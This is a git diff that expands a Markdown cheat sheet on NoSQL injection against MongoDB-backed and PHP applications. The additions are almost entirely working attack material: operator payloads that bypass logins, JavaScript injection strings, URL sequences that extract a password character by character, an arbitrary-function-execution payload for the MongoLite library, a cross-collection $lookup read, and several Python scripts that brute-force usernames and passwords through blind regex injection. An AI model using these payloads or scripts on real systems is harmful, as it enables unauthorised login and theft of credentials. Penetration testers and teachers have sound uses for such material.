@@ -1,5 +1,20 @@
 # NoSQL Injection
 ## Exploit
+**PHP**
+
+The exploits are based in adding an Operator
+```php
+username[$ne]=1$password[$ne]=1 #<Not Equals>
+username[$regex]=^adm$password[$ne]=1 #Check a <regular expression>, could be used to brute-force a parameter
+username[$regex]=.{25}&pass[$ne]=1 #Use the <regex> to find the length of a value
+username[$eq]=admin&password[$ne]=1 #<Equals>
+username[$ne]=admin&pass[$lt]=s #<Less than>, Brute-force pass[$lt] to find more users
+username[$ne]=admin&pass[$gt]=s #<Greater Than>
+username[$nin][admin]=admin&username[$nin][test]=test&pass[$ne]=7 #<Matches non of the values of the array> (not test and not admin)
+{ $where: "this.credits == this.debits" }#<IF>, can be used to execute code
+
+```
+
 ### Authentication Bypass
 Basic authentication bypass using not equal ($ne) or greater ($gt)
 ```javascript
@@ -16,6 +31,13 @@ in JSON
 {"username": {"$gt":""}, "password": {"$gt":""}}
 
 ```
+### SQL - Mongo
+```html
+Normal sql: ' or 1=1-- -
+Mongo sql: ' || 1==1//    or    ' || 1==1%00
+
+```
+
 ### Extract length information
 ```javascript
 username[$ne]=toto&password[$regex]=.{1}
@@ -43,6 +65,21 @@ Extract data with "in"
 {"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
 
 ```
+
+### SQL - Mongo
+```html
+/?search=admin' && this.password%00 --> Check if the field password exists
+/?search=admin' && this.password && this.password.match(/.*/)%00 --> start matching password
+/?search=admin' && this.password && this.password.match(/^a.*$/)%00
+/?search=admin' && this.password && this.password.match(/^b.*$/)%00
+/?search=admin' && this.password && this.password.match(/^c.*$/)%00
+...
+/?search=admin' && this.password && this.password.match(/^duvj.*$/)%00
+...
+/?search=admin' && this.password && this.password.match(/^duvj78i3u$/)%00  Found
+
+```
+
 ### SSJI
 ```javascript
 ';return 'a'=='a' && ''=='
@@ -51,7 +88,77 @@ Extract data with "in"
 
 ```
 
+### PHP Arbitrary Function Execution
+Using the $func operator of the [MongoLite](https://github.com/agentejo/cockpit/tree/0.11.1/lib/MongoLite) library (used by default) it might be possible to execute and arbitrary function as in [this report](https://swarm.ptsecurity.com/rce-cockpit-cms/).
+
+```javascript
+"user":{"$func": "var_dump"}
+
+```
+![123](https://github.com/Mehdi0x90/Web_Hacking/assets/17106836/1044d5ff-11cf-4808-8c70-94382fbf55ae)
+
+### Get info from different collection
+It's possible to use [$lookup](https://www.mongodb.com/docs/manual/reference/operator/aggregation/lookup/) to get info from a different collection. In the following example, we are reading from a different collection called users and getting the results of all the entries with a password matching a wildcard.
+```javascript
+[
+  {
+    "$lookup":{
+      "from": "users",
+      "as":"resultado","pipeline": [
+        {
+          "$match":{
+            "password":{
+              "$regex":"^.*"
+            }
+          }
+        }
+      ]
+    }
+  }
+]
+
+```
+
 ## Blind NoSQL
+
+```python
+import requests, string
+
+alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_@{}-/()!\"$%=^[]:;"
+
+flag = ""
+for i in range(21):
+    print("[i] Looking for char number "+str(i+1))
+    for char in alphabet:
+        r = requests.get("http://chall.com?param=^"+flag+char)
+        if ("<TRUE>" in r.text):
+            flag += char
+            print("[+] Flag: "+flag)
+            break
+
+```
+```python
+import requests
+import urllib3
+import string
+import urllib
+urllib3.disable_warnings()
+
+username="admin"
+password=""
+
+while True:
+    for c in string.printable:
+        if c not in ['*','+','.','?','|']:
+            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
+            r = requests.post(u, data = {'ids': payload}, verify = False)
+            if 'OK' in r.text:
+                print("Found one more char : %s" % (password+c))
+                password += c
+
+
+```
+
 ### POST with JSON body
 python script
 ```python
@@ -176,6 +283,79 @@ db.injection.insert({success:1});return 1;db.stores.mapReduce(function() { { emi
 0;return true
 
 ```
+
+## Tools
+* https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration
+* https://github.com/C4l1b4n/NoSQL-Attack-Suite
+
+### Brute-force login usernames and passwords from POST login
+This is a simple script that you could modify but the previous tools can also do this task.
+```python
+import requests
+import string
+
+url = "http://example.com"
+headers = {"Host": "exmaple.com"}
+cookies = {"PHPSESSID": "s3gcsgtqre05bah2vt6tibq8lsdfk"}
+possible_chars = list(string.ascii_letters) + list(string.digits) + ["\\"+c for c in string.punctuation+string.whitespace ]
+def get_password(username):
+    print("Extracting password of "+username)
+    params = {"username":username, "password[$regex]":"", "login": "login"}
+    password = "^"
+    while True:
+        for c in possible_chars:
+            params["password[$regex]"] = password + c + ".*"
+            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
+            if int(pr.status_code) == 302:
+                password += c
+                break
+        if c == possible_chars[-1]:
+            print("Found password "+password[1:].replace("\\", "")+" for username "+username)
+            return password[1:].replace("\\", "")
+
+def get_usernames():
+    usernames = []
+    params = {"username[$regex]":"", "password[$regex]":".*", "login": "login"}
+    for c in possible_chars:
+        username = "^" + c
+        params["username[$regex]"] = username + ".*"
+        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
+        if int(pr.status_code) == 302:
+            print("Found username starting with "+c)
+            while True:
+                for c2 in possible_chars:
+                    params["username[$regex]"] = username + c2 + ".*"
+                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False).status_code) == 302:
+                        username += c2
+                        print(username)
+                        break
+
+                if c2 == possible_chars[-1]:
+                    print("Found username: "+username[1:])
+                    usernames.append(username[1:])
+                    break
+    return usernames
+
+
+for u in get_usernames():
+    get_password(u)
+
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
